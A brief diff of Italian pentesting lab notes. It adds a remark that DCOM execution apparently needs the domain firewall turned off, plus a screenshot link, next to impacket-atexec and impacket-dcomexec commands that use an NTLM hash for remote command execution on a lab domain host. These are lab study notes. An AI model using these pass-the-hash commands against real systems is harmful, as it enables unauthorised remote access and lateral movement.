@@ -264,7 +264,8 @@ impacket-atexec -hashes ':cba36eccfd9d949c73bc73715364aff5' NORTH/catelyn.stark@
 ```
 ![[Pasted image 20230907163321.png]]
 - DcomExec (Pseudo Shell)
-Protocollo DCERPC + SMB (Sembrerebbe che )
+Protocollo DCERPC + SMB (Sembrerebbe che sia necessario tirare giu il firewall Domain Network Setting)
 ```bash
 impacket-dcomexec -hashes ':cba36eccfd9d949c73bc73715364aff5' NORTH/catelyn.stark@192.168.56.11
 ```
+![[Pasted image 20230907163542.png]]
